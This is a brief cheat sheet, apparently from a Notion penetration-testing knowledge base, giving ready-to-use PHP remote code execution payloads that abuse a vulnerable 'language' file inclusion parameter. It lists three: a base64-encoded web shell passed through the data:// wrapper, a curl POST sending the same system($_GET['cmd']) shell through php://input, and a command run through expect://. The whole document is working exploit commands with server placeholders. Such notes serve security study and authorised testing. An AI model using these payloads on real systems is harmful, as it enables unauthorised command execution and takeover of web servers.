# PHP RCE Examples

OS: PHP, Web
Description: RCE PHP Wrappers
Security Domains: Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21)
Target_Technology: php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21)

| **Command** | **Description** |
| --- | --- |
| **PHP Wrappers** |  |
| `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id` | RCE with data wrapper |
| `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"` | RCE with input wrapper |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"` | RCE with expect wrapper |